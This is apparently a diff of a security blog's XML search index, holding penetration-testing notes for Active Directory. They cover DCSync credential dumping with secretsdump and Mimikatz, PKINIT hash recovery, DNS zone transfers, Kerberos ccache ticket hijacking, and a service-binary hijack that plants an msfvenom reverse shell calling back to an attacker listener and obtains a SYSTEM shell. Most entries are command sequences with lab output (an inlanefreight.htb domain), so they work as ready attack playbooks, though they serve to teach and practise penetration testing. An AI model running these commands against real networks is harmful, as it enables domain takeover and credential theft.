+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=dc01.ccache</span><br></pre></td></tr></table></figure>
+
+<h5 id="DCSync-the-Domain"><a href="#DCSync-the-Domain" class="headerlink" title="DCSync the Domain"></a>DCSync the Domain</h5><blockquote>
+<p>➜ DCSync the administrator using the DC’s ticket.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">secretsdump.py -just-dc-user &lt;DOMAIN&gt;/administrator -k -no-pass <span class="string">&quot;&lt;DC_FQDN&gt;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Alternative-—-Recover-the-DC’s-NT-Hash"><a href="#Alternative-—-Recover-the-DC’s-NT-Hash" class="headerlink" title="Alternative — Recover the DC’s NT Hash"></a>Alternative — Recover the DC’s NT Hash</h4><h5 id="Extract-the-NT-Hash"><a href="#Extract-the-NT-Hash" class="headerlink" title="Extract the NT Hash"></a>Extract the NT Hash</h5><blockquote>
+<p>➜ Submit a TGS request for ourselves to recover the DC machine account’s NT hash from the TGT.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 /opt/PKINITtools/getnthash.py -key &lt;AS-REP_KEY&gt; &lt;DOMAIN&gt;/&lt;DC_NAME&gt;\$</span><br></pre></td></tr></table></figure>
+
+<h5 id="Validate-via-Pass-the-Hash"><a href="#Validate-via-Pass-the-Hash" class="headerlink" title="Validate via Pass-the-Hash"></a>Validate via Pass-the-Hash</h5><blockquote>
+<p>➜ Tool: <strong>NetExec</strong> (<code>nxc</code>). Confirm the recovered DC hash works against the DC.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb &lt;DC_IP&gt; -u &lt;DC_NAME&gt;$ -H &lt;NT_HASH&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="Windows-Path"><a href="#Windows-Path" class="headerlink" title="Windows Path"></a>Windows Path</h4><h5 id="Request-a-TGT-with-Rubeus"><a href="#Request-a-TGT-with-Rubeus" class="headerlink" title="Request a TGT with Rubeus"></a>Request a TGT with Rubeus</h5><blockquote>
+<p>➜ Request and inject a TGT using the certificate.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">.\Rubeus.exe asktgt /user:&lt;DC_NAME&gt;<span class="variable">$</span> /certificate:&lt;base64&gt; /ptt</span><br></pre></td></tr></table></figure>
+
+<h5 id="DCSync-with-Mimikatz"><a href="#DCSync-with-Mimikatz" class="headerlink" title="DCSync with Mimikatz"></a>DCSync with Mimikatz</h5><blockquote>
+<p>➜ DCSync the krbtgt account once the ticket is injected.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">.\mimikatz.exe <span class="string">&quot;lsadump::dcsync /user:&lt;DOMAIN&gt;\krbtgt&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Exploitation</category>
+        <category>Bleeding-Edge &amp; Coercion</category>
+      </categories>
+      <tags>
+        <tag>secretsdump</tag>
+        <tag>Windows</tag>
+        <tag>Privilege-Escalation</tag>
+        <tag>Mimikatz</tag>
+        <tag>Rubeus</tag>
+        <tag>Active-Directory</tag>
+        <tag>NetExec</tag>
+        <tag>Domain-Escalation</tag>
+        <tag>NoPac</tag>
+        <tag>CVE-2021-42278</tag>
+        <tag>CVE-2021-42287</tag>
+        <tag>PrintNightmare</tag>
+        <tag>CVE-2021-1675</tag>
+        <tag>CVE-2021-34527</tag>
+        <tag>PetitPotam</tag>
+        <tag>CVE-2021-36942</tag>
+        <tag>ADCS</tag>
+        <tag>NTLM-Relay</tag>
+        <tag>PKINIT</tag>
+        <tag>ntlmrelayx</tag>
+        <tag>PKINITtools</tag>
+        <tag>DCSync</tag>
+        <tag>Impacket</tag>
+        <tag>Print-Spooler</tag>
+        <tag>Certificate-Abuse</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Hyper-V Administrators</title>
     <url>/2026/03/06/Hyper-V-Administrators/</url>
     <content><![CDATA[<blockquote>
@@ -1749,6 +1749,63 @@
     <title>Initial Enumeration</title>
     <url>/2026/06/29/Initial-Enumeration/</url>
     <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>Internal DNS Enumeration</title>
+    <url>/2026/07/04/Internal-DNS-Enumeration/</url>
+    <content><![CDATA[<blockquote>
+<p>➜ From inside the network, DNS gives up the domain’s structure for free, the DC publishes its own roles as SRV records, and AD-integrated zones can often be dumped.</p>
+</blockquote>
+<h3 id="Locate-AD-Roles-via-SRV-Records"><a href="#Locate-AD-Roles-via-SRV-Records" class="headerlink" title="Locate AD Roles via SRV Records"></a>Locate AD Roles via SRV Records</h3><blockquote>
+<p>➜ Find the Domain Controllers.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nslookup -<span class="built_in">type</span>=SRV _ldap._tcp.dc._msdcs.&lt;DOMAIN&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>➜ Find the KDC (Kerberos).</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nslookup -<span class="built_in">type</span>=SRV _kerberos._tcp.&lt;DOMAIN&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Zone-Transfer"><a href="#Zone-Transfer" class="headerlink" title="Zone Transfer"></a>Zone Transfer</h3><blockquote>
+<p>➜ Attempt a full zone transfer</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dig axfr &lt;DOMAIN&gt; @&lt;DC_IP&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Or</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dnsrecon -d &lt;DOMAIN&gt; -t axfr</span><br></pre></td></tr></table></figure>
+
+<h3 id="Dump-AD-Integrated-DNS"><a href="#Dump-AD-Integrated-DNS" class="headerlink" title="Dump AD-Integrated DNS"></a>Dump AD-Integrated DNS</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pipx install adidnsdump</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>➜ Dump every record in the AD-integrated zone with a valid domain account.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adidnsdump -u &lt;DOMAIN&gt;\&lt;user&gt; ldap://&lt;DC_IP&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>➜ Re-run with the resolve flag to reveal records hidden on the first pass.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adidnsdump -u &lt;DOMAIN&gt;\&lt;user&gt; ldap://&lt;DC_IP&gt; -r</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Exploitation</category>
+        <category>Enumeration</category>
+        <category>Internal DNS Enumeration</category>
+      </categories>
+      <tags>
+        <tag>Active-Directory</tag>
+        <tag>DNS</tag>
+        <tag>dig</tag>
+        <tag>Internal-DNS</tag>
+        <tag>DNS-Enumeration</tag>
+        <tag>Domain-Controllers</tag>
+        <tag>Zone-Transfer</tag>
+        <tag>AXFR</tag>
+        <tag>dnsrecon</tag>
+        <tag>nslookup</tag>
+        <tag>adidnsdump</tag>
+      </tags>
   </entry>
   <entry>
     <title>Kerberoasting &amp; ASREPRoasting</title>
@@ -2143,7 +2200,6 @@
         <tag>net</tag>
         <tag>Windows</tag>
         <tag>Active-Directory</tag>
-        <tag>Enumeration</tag>
         <tag>Microsoft-Defender</tag>
         <tag>AppLocker</tag>
         <tag>PowerShell</tag>
@@ -2151,6 +2207,8 @@
         <tag>User-Enumeration</tag>
         <tag>Group-Enumeration</tag>
         <tag>Share-Enumeration</tag>
+        <tag>Enumeration</tag>
+        <tag>Domain-Controllers</tag>
         <tag>Living-Off-the-Land</tag>
         <tag>LOLBAS</tag>
         <tag>Native-Commands</tag>
@@ -2165,7 +2223,6 @@
         <tag>Environment-Variables</tag>
         <tag>Firewall</tag>
         <tag>Active-Sessions</tag>
-        <tag>Domain-Controllers</tag>
       </tags>
   </entry>
   <entry>
@@ -2631,9 +2688,9 @@
       </categories>
       <tags>
         <tag>netexec</tag>
-        <tag>PetitPotam</tag>
         <tag>impacket-ntlmrelayx</tag>
         <tag>printerbug</tag>
+        <tag>PetitPotam</tag>
         <tag>DFSCoerce</tag>
         <tag>Responder</tag>
       </tags>
@@ -2723,38 +2780,6 @@
       </tags>
   </entry>
   <entry>
-    <title>PTT : Abusing KeyTab ccache</title>
-    <url>/2025/11/29/PTT-Abusing-KeyTab-ccache/</url>
-    <content><![CDATA[<h1 id="Finding-ccache-files"><a href="#Finding-ccache-files" class="headerlink" title="Finding ccache files"></a>Finding ccache files</h1><h4 id="Reviewing-environment-variables-for-ccache-files"><a href="#Reviewing-environment-variables-for-ccache-files" class="headerlink" title="Reviewing environment variables for ccache files."></a>Reviewing environment variables for ccache files.</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">env</span> | grep -i krb5</span><br><span class="line"></span><br><span class="line">KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh</span><br></pre></td></tr></table></figure>
-
-<h4 id="Searching-for-ccache-files-in-tmp"><a href="#Searching-for-ccache-files-in-tmp" class="headerlink" title="Searching for ccache files in &#x2F;tmp"></a>Searching for ccache files in &#x2F;tmp</h4><p><code>➜ if we gain access as root or a privileged user, we would be able to impersonate a user using their </code>ccache<code> file while it is still valid.</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -la /tmp</span><br><span class="line"></span><br><span class="line">-rw-------  1 julio@inlanefreight.htb  domain <span class="built_in">users</span>@inlanefreight.htb 1406 Oct  6 16:38 krb5cc_647401106_tBswau</span><br><span class="line">-rw-------  1 david@inlanefreight.htb  domain <span class="built_in">users</span>@inlanefreight.htb 1406 Oct  6 15:23 krb5cc_647401107_Gf415d</span><br><span class="line">-rw-------  1 carlos@inlanefreight.htb domain <span class="built_in">users</span>@inlanefreight.htb 1433 Oct  6 15:43 krb5cc_647402606_qd2Pfh</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="Abusing-KeyTab-ccache"><a href="#Abusing-KeyTab-ccache" class="headerlink" title="Abusing KeyTab ccache"></a>Abusing KeyTab ccache</h1><h4 id="Note"><a href="#Note" class="headerlink" title="Note:"></a>Note:</h4><p><code>➜ Note: We need root access to impersonate a user using a ccache file, since ccache files are readable only by their owners.</code></p>
-<h4 id="Importing-the-ccache-file-into-our-current-session"><a href="#Importing-the-ccache-file-into-our-current-session" class="headerlink" title="Importing the ccache file into our current session"></a>Importing the ccache file into our current session</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=/tmp/root/krb5cc_647401106_I8I133</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">klist</span><br><span class="line"></span><br><span class="line">Ticket cache: FILE:/root/krb5cc_647401106_I8I133</span><br><span class="line">Default principal: julio@INLANEFREIGHT.HTB</span><br><span class="line"></span><br><span class="line">Valid starting       Expires              Service principal</span><br><span class="line">10/07/2022 13:25:01  10/07/2022 23:25:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB</span><br><span class="line">        renew <span class="keyword">until</span> 10/08/2022 13:25:01</span><br></pre></td></tr></table></figure>
-
-<p>Example</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient //dc01/C$ -k -c <span class="built_in">ls</span> -no-pass</span><br></pre></td></tr></table></figure>
-
-<h1 id="Automated-Harvesting-Of-Ccache-Files"><a href="#Automated-Harvesting-Of-Ccache-Files" class="headerlink" title="Automated Harvesting Of Ccache Files"></a>Automated Harvesting Of Ccache Files</h1><h2 id="Linikatz"><a href="#Linikatz" class="headerlink" title="Linikatz"></a>Linikatz</h2><p><code>➜ It requires root access and extracts credentials (including Kerberos tickets) from services like FreeIPA, SSSD, Samba, and others.</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[!bash!]$ /opt/linikatz.sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Valid starting       Expires              Service principal</span><br><span class="line">10/10/2022 19:48:03  10/11/2022 05:48:03  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB</span><br><span class="line">    renew <span class="keyword">until</span> 10/11/2022 19:48:03, Flags: RIA</span><br><span class="line">    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: </span><br><span class="line">I: [kerberos-check] User Kerberos tickets</span><br><span class="line">Ticket cache: FILE:/tmp/krb5cc_647401106_HRJDux</span><br><span class="line">Default principal: julio@INLANEFREIGHT.HTB</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Linux</category>
-        <category>Post Exploitation</category>
-        <category>Pass the Ticket (Ptt)</category>
-        <category>KeyTab Ccache Abuse</category>
-      </categories>
-      <tags>
-        <tag>klist</tag>
-        <tag>ccache</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>PTT : KeyTab File Abuse</title>
     <url>/2025/11/29/PTT-KeyTab-File-Abuse/</url>
     <content><![CDATA[<h1 id="Finding-Keytab-files"><a href="#Finding-Keytab-files" class="headerlink" title="Finding Keytab files"></a>Finding Keytab files</h1><h4 id="Note"><a href="#Note" class="headerlink" title="Note:"></a>Note:</h4><p><code>➜ To use a keytab file, we must have read and write (rw) privileges on the file.</code></p>
@@ -2796,6 +2821,38 @@
         <tag>klist</tag>
         <tag>kinit</tag>
         <tag>KeyTabExtract</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PTT : Abusing KeyTab ccache</title>
+    <url>/2025/11/29/PTT-Abusing-KeyTab-ccache/</url>
+    <content><![CDATA[<h1 id="Finding-ccache-files"><a href="#Finding-ccache-files" class="headerlink" title="Finding ccache files"></a>Finding ccache files</h1><h4 id="Reviewing-environment-variables-for-ccache-files"><a href="#Reviewing-environment-variables-for-ccache-files" class="headerlink" title="Reviewing environment variables for ccache files."></a>Reviewing environment variables for ccache files.</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">env</span> | grep -i krb5</span><br><span class="line"></span><br><span class="line">KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh</span><br></pre></td></tr></table></figure>
+
+<h4 id="Searching-for-ccache-files-in-tmp"><a href="#Searching-for-ccache-files-in-tmp" class="headerlink" title="Searching for ccache files in &#x2F;tmp"></a>Searching for ccache files in &#x2F;tmp</h4><p><code>➜ if we gain access as root or a privileged user, we would be able to impersonate a user using their </code>ccache<code> file while it is still valid.</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -la /tmp</span><br><span class="line"></span><br><span class="line">-rw-------  1 julio@inlanefreight.htb  domain <span class="built_in">users</span>@inlanefreight.htb 1406 Oct  6 16:38 krb5cc_647401106_tBswau</span><br><span class="line">-rw-------  1 david@inlanefreight.htb  domain <span class="built_in">users</span>@inlanefreight.htb 1406 Oct  6 15:23 krb5cc_647401107_Gf415d</span><br><span class="line">-rw-------  1 carlos@inlanefreight.htb domain <span class="built_in">users</span>@inlanefreight.htb 1433 Oct  6 15:43 krb5cc_647402606_qd2Pfh</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Abusing-KeyTab-ccache"><a href="#Abusing-KeyTab-ccache" class="headerlink" title="Abusing KeyTab ccache"></a>Abusing KeyTab ccache</h1><h4 id="Note"><a href="#Note" class="headerlink" title="Note:"></a>Note:</h4><p><code>➜ Note: We need root access to impersonate a user using a ccache file, since ccache files are readable only by their owners.</code></p>
+<h4 id="Importing-the-ccache-file-into-our-current-session"><a href="#Importing-the-ccache-file-into-our-current-session" class="headerlink" title="Importing the ccache file into our current session"></a>Importing the ccache file into our current session</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=/tmp/root/krb5cc_647401106_I8I133</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">klist</span><br><span class="line"></span><br><span class="line">Ticket cache: FILE:/root/krb5cc_647401106_I8I133</span><br><span class="line">Default principal: julio@INLANEFREIGHT.HTB</span><br><span class="line"></span><br><span class="line">Valid starting       Expires              Service principal</span><br><span class="line">10/07/2022 13:25:01  10/07/2022 23:25:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB</span><br><span class="line">        renew <span class="keyword">until</span> 10/08/2022 13:25:01</span><br></pre></td></tr></table></figure>
+
+<p>Example</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient //dc01/C$ -k -c <span class="built_in">ls</span> -no-pass</span><br></pre></td></tr></table></figure>
+
+<h1 id="Automated-Harvesting-Of-Ccache-Files"><a href="#Automated-Harvesting-Of-Ccache-Files" class="headerlink" title="Automated Harvesting Of Ccache Files"></a>Automated Harvesting Of Ccache Files</h1><h2 id="Linikatz"><a href="#Linikatz" class="headerlink" title="Linikatz"></a>Linikatz</h2><p><code>➜ It requires root access and extracts credentials (including Kerberos tickets) from services like FreeIPA, SSSD, Samba, and others.</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[!bash!]$ /opt/linikatz.sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Valid starting       Expires              Service principal</span><br><span class="line">10/10/2022 19:48:03  10/11/2022 05:48:03  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB</span><br><span class="line">    renew <span class="keyword">until</span> 10/11/2022 19:48:03, Flags: RIA</span><br><span class="line">    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: </span><br><span class="line">I: [kerberos-check] User Kerberos tickets</span><br><span class="line">Ticket cache: FILE:/tmp/krb5cc_647401106_HRJDux</span><br><span class="line">Default principal: julio@INLANEFREIGHT.HTB</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Linux</category>
+        <category>Post Exploitation</category>
+        <category>Pass the Ticket (Ptt)</category>
+        <category>KeyTab Ccache Abuse</category>
+      </categories>
+      <tags>
+        <tag>klist</tag>
+        <tag>ccache</tag>
       </tags>
   </entry>
   <entry>
@@ -2939,6 +2996,74 @@
         <tag>DomainPasswordSpray</tag>
         <tag>Lockout-Policy</tag>
         <tag>Domain-Users</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Permissive File System ACLs</title>
+    <url>/2026/06/19/Permissive-File-System-ACLs/</url>
+    <content><![CDATA[<blockquote>
+<p>➜ Permissive File System ACLs occur when a low-privileged user has <code>write</code> or <code>full control</code> permissions over a service binary, allowing them to replace it with a malicious executable, when the service restarts, the payload runs under the service’s account, typically <code>SYSTEM</code>.</p>
+</blockquote>
+<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h4 id="Enumerating-Modifiable-Service-Binaries"><a href="#Enumerating-Modifiable-Service-Binaries" class="headerlink" title="Enumerating Modifiable Service Binaries"></a>Enumerating Modifiable Service Binaries</h4><blockquote>
+<p>➜ As we can see, SharpUp identified a service whose binary has a weak ACL and lists it under <code>Modifiable Service Binaries</code>.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\SharpUp.exe audit</span><br><span class="line"></span><br><span class="line">=== Modifiable Service Binaries ===</span><br><span class="line"></span><br><span class="line">  Name             : service<span class="literal">-name</span></span><br><span class="line">  DisplayName      : Service Display Name</span><br><span class="line">  Description      : Service description</span><br><span class="line">  State            : Stopped</span><br><span class="line">  StartMode        : Auto</span><br><span class="line">  PathName         : <span class="string">&quot;C:\Program Files\service-name\service-name.exe&quot;</span></span><br><span class="line"></span><br><span class="line">  &lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Confirming-the-File-ACL-with-icacls"><a href="#Confirming-the-File-ACL-with-icacls" class="headerlink" title="Confirming the File ACL with icacls"></a>Confirming the File ACL with icacls</h4><blockquote>
+<p>➜ Both <code>BUILTIN\Users</code> and <code>Everyone</code> have <code>Full Access (F)</code> over the service binary, so we can modify or replace it.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; icacls <span class="string">&quot;C:\Program Files\service-name\service-name.exe&quot;</span></span><br><span class="line"></span><br><span class="line">C:\Program Files\service<span class="literal">-name</span>\service<span class="literal">-name</span>.exe BUILTIN\Users:(I)(F)</span><br><span class="line">                                               Everyone:(I)(F)</span><br><span class="line">                                               NT AUTHORITY\SYSTEM:(I)(F)</span><br></pre></td></tr></table></figure>
+
+<h4 id="Checking-the-Service-Account"><a href="#Checking-the-Service-Account" class="headerlink" title="Checking the Service Account"></a>Checking the Service Account</h4><blockquote>
+<p>➜ We check the service account with <code>sc qc</code>. </p>
+<ul>
+<li><code>SERVICE_START_NAME : LocalSystem</code> confirms our payload will run as <code>SYSTEM</code>.</li>
+</ul>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; sc.exe qc service<span class="literal">-name</span></span><br><span class="line"></span><br><span class="line">[<span class="type">SC</span>] QueryServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">    SERVICE_NAME: service<span class="literal">-name</span></span><br><span class="line">    <span class="built_in">TYPE</span>               : <span class="number">10</span>  WIN32_OWN_PROCESS</span><br><span class="line">    START_TYPE         : <span class="number">2</span>   AUTO_START</span><br><span class="line">    BINARY_PATH_NAME   : <span class="string">&quot;C:\Program Files\service-name\service-name.exe&quot;</span></span><br><span class="line">    SERVICE_START_NAME : LocalSystem</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><h4 id="Generating-the-Malicious-Binary"><a href="#Generating-the-Malicious-Binary" class="headerlink" title="Generating the Malicious Binary"></a>Generating the Malicious Binary</h4><blockquote>
+<p>➜ We craft a reverse-shell executable that connects back to our listener, we name it with the same target service binary so it overwrites the legitimate one.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ip LPORT=port -f exe -o service-name.exe</span><br></pre></td></tr></table></figure>
+
+<h4 id="Starting-the-Listener"><a href="#Starting-the-Listener" class="headerlink" title="Starting the Listener"></a>Starting the Listener</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rlwrap nc -lvnp port</span><br></pre></td></tr></table></figure>
+
+<h4 id="Checking-If-We-Can-Start-And-Stop-the-Service"><a href="#Checking-If-We-Can-Start-And-Stop-the-Service" class="headerlink" title="Checking If We Can Start And Stop the Service"></a>Checking If We Can Start And Stop the Service</h4><blockquote>
+<p> ➜ To force the service to reload our new binary without waiting for an auto-start or a system reboot, we need to restart it by ourselves which requires <code>SERVICE_STOP</code> to stop it and <code>SERVICE_START</code> to start it again.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PS C:\&gt; .\accesschk.exe /accepteula -uvqc SecurityService</span><br><span class="line"></span><br><span class="line">SecurityService</span><br><span class="line">  RW NT AUTHORITY\SYSTEM</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">  RW BUILTIN\Administrators</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">  R  NT AUTHORITY\INTERACTIVE</span><br><span class="line">        SERVICE_QUERY_STATUS</span><br><span class="line">        SERVICE_QUERY_CONFIG</span><br><span class="line">        SERVICE_INTERROGATE</span><br><span class="line">        SERVICE_ENUMERATE_DEPENDENTS</span><br><span class="line">        READ_CONTROL</span><br><span class="line">  R  Everyone</span><br><span class="line">        SERVICE_START</span><br><span class="line">        SERVICE_STOP</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="Stop-the-Service"><a href="#Stop-the-Service" class="headerlink" title="Stop the Service"></a>Stop the Service</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\&gt; <span class="built_in">sc</span> stop SecurityService</span><br></pre></td></tr></table></figure>
+
+<h4 id="Replacing-the-Service-Binary"><a href="#Replacing-the-Service-Binary" class="headerlink" title="Replacing the Service Binary"></a>Replacing the Service Binary</h4><blockquote>
+<p>➜ The service is <code>Stopped</code>, so we can overwrite the file directly. </p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\&gt; cmd /c <span class="built_in">copy</span> /Y SecurityService.exe <span class="string">&quot;C:\Program Files (x86)\PCProtect\SecurityService.exe&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Starting-the-Service"><a href="#Starting-the-Service" class="headerlink" title="Starting the Service"></a>Starting the Service</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\&gt; <span class="built_in">sc</span> <span class="built_in">start</span> SecurityService</span><br></pre></td></tr></table></figure>
+
+<h4 id="Getting-a-SYSTEM-Shell"><a href="#Getting-a-SYSTEM-Shell" class="headerlink" title="Getting a SYSTEM Shell"></a>Getting a SYSTEM Shell</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  weak-permissions rlwrap nc -lvnp 8888</span><br><span class="line">listening on [any] 8888 ...</span><br><span class="line">connect to [10.10.14.5] from (UNKNOWN) [10.10.10.X] 49xxx</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt; <span class="built_in">whoami</span></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Windows Privesc</category>
+        <category>Services</category>
+      </categories>
+      <tags>
+        <tag>msfvenom</tag>
+        <tag>Weak-ACL</tag>
+        <tag>AccessChk</tag>
+        <tag>icacls</tag>
+        <tag>Permissive-File-System-ACLs</tag>
+        <tag>Modifiable-Service-Binary</tag>
+        <tag>Service-Binary-Replacement</tag>
+        <tag>SharpUp</tag>
+        <tag>sc.exe</tag>
+        <tag>Windows-Services</tag>
       </tags>
   </entry>
   <entry>
@@ -3989,74 +4114,6 @@
       </categories>
   </entry>
   <entry>
-    <title>Permissive File System ACLs</title>
-    <url>/2026/06/19/Permissive-File-System-ACLs/</url>
-    <content><![CDATA[<blockquote>
-<p>➜ Permissive File System ACLs occur when a low-privileged user has <code>write</code> or <code>full control</code> permissions over a service binary, allowing them to replace it with a malicious executable, when the service restarts, the payload runs under the service’s account, typically <code>SYSTEM</code>.</p>
-</blockquote>
-<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h4 id="Enumerating-Modifiable-Service-Binaries"><a href="#Enumerating-Modifiable-Service-Binaries" class="headerlink" title="Enumerating Modifiable Service Binaries"></a>Enumerating Modifiable Service Binaries</h4><blockquote>
-<p>➜ As we can see, SharpUp identified a service whose binary has a weak ACL and lists it under <code>Modifiable Service Binaries</code>.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\SharpUp.exe audit</span><br><span class="line"></span><br><span class="line">=== Modifiable Service Binaries ===</span><br><span class="line"></span><br><span class="line">  Name             : service<span class="literal">-name</span></span><br><span class="line">  DisplayName      : Service Display Name</span><br><span class="line">  Description      : Service description</span><br><span class="line">  State            : Stopped</span><br><span class="line">  StartMode        : Auto</span><br><span class="line">  PathName         : <span class="string">&quot;C:\Program Files\service-name\service-name.exe&quot;</span></span><br><span class="line"></span><br><span class="line">  &lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
-
-<h4 id="Confirming-the-File-ACL-with-icacls"><a href="#Confirming-the-File-ACL-with-icacls" class="headerlink" title="Confirming the File ACL with icacls"></a>Confirming the File ACL with icacls</h4><blockquote>
-<p>➜ Both <code>BUILTIN\Users</code> and <code>Everyone</code> have <code>Full Access (F)</code> over the service binary, so we can modify or replace it.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; icacls <span class="string">&quot;C:\Program Files\service-name\service-name.exe&quot;</span></span><br><span class="line"></span><br><span class="line">C:\Program Files\service<span class="literal">-name</span>\service<span class="literal">-name</span>.exe BUILTIN\Users:(I)(F)</span><br><span class="line">                                               Everyone:(I)(F)</span><br><span class="line">                                               NT AUTHORITY\SYSTEM:(I)(F)</span><br></pre></td></tr></table></figure>
-
-<h4 id="Checking-the-Service-Account"><a href="#Checking-the-Service-Account" class="headerlink" title="Checking the Service Account"></a>Checking the Service Account</h4><blockquote>
-<p>➜ We check the service account with <code>sc qc</code>. </p>
-<ul>
-<li><code>SERVICE_START_NAME : LocalSystem</code> confirms our payload will run as <code>SYSTEM</code>.</li>
-</ul>
-</blockquote>
